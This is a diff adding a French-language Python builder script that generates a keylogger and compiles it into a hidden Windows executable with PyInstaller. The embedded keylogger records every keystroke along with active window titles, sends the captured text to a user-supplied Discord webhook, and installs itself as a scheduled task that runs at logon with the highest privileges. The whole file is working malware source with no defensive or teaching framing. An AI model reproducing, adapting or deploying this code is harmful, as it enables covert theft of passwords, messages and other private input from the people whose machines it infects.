@@ -1,0 +1,118 @@
+import os
+import subprocess
+import sys
+
+def main():
+    webhook = input("Entrez l'URL du webhook Discord 🔗 : ").strip()
+    if not webhook.startswith("https://"):
+        print("Webhook invalide.")
+        return
+
+    KEYLOGGER_TEMPLATE = '''
+import time
+import threading
+import requests
+from pynput import keyboard
+import ctypes
+import sys
+
+webhook_url = "{webhook}"
+
+def send_to_discord(content):
+    data = {{
+        "embeds": [{{
+            "title": "Keylogger Log",
+            "description": content,
+            "color": 15258703
+        }}]
+    }}
+    try:
+        requests.post(webhook_url, json=data)
+    except:
+        pass
+
+current_window = None
+buffer = []
+
+def get_active_window_title():
+    user32 = ctypes.windll.user32
+    pid = ctypes.c_ulong()
+    hwnd = user32.GetForegroundWindow()
+    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+    length = user32.GetWindowTextLengthW(hwnd)
+    buff = ctypes.create_unicode_buffer(length + 1)
+    user32.GetWindowTextW(hwnd, buff, length + 1)
+    return buff.value
+
+def on_press(key):
+    global buffer, current_window
+    try:
+        window = get_active_window_title()
+        if window != current_window:
+            if buffer:
+                send_to_discord(f"Fenêtre: {{current_window}}\\nTexte: {{''.join(buffer)}}")
+                buffer = []
+            current_window = window
+        if hasattr(key, 'char') and key.char is not None:
+            buffer.append(key.char)
+        else:
+            buffer.append(f"[{{key.name}}]")
+        if len(buffer) >= 20:
+            send_to_discord(f"Fenêtre: {{current_window}}\\nTexte: {{''.join(buffer)}}")
+            buffer = []
+    except Exception:
+        pass
+
+def persist_task():
+    import subprocess
+    import os
+    exe_path = os.path.abspath(sys.argv[0])
+    task_name = "KLTask"
+    cmd = f'schtasks /Create /TN {{task_name}} /TR "{{exe_path}}" /SC ONLOGON /RL HIGHEST /F'
+    subprocess.call(cmd, shell=True)
+
+def main():
+    persist_task()
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
+'''
+
+    temp_py = "keylogger_temp.py"
+    with open(temp_py, "w", encoding="utf-8") as f:
+        f.write(KEYLOGGER_TEMPLATE.format(webhook=webhook))
+
+    output_dir = "output"
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
+
+    exe_name = "keylogger.exe"
+    cmd = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        "--distpath",
+        output_dir,
+        "--name",
+        "keylogger",
+        temp_py
+    ]
+
+    print(" ⚙️ Compilation en .exe, cela peut prendre quelques secondes...")
+    subprocess.run(cmd)
+
+    for file in [temp_py, "keylogger_temp.spec"]:
+        if os.path.exists(file):
+            os.remove(file)
+    for folder in ["build", "__pycache__"]:
+        if os.path.exists(folder):
+            import shutil
+            shutil.rmtree(folder)
+
+    print(f"Terminé. L'exécutable est dans '{output_dir}/{exe_name}'.")
+
+if __name__ == "__main__":
+    main()
+    input("Appuie sur Entrée pour quitter...")
